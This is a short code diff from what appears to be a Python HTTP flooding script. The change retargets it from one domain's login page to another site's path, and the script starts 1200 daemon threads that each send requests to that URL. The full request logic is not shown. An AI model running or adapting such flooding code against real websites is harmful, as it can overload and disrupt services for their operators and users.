@@ -17,7 +17,7 @@ def chek(url):
             print("Request failed")
 
 def start_threads():
-    target_url = "https://viphexor2.hexor1.xyz/login"
+    target_url = "https://adminpanel.in.net/spider"
     for _ in range(1200):
         thread = threading.Thread(target=chek, args=(target_url,))
         thread.daemon = True
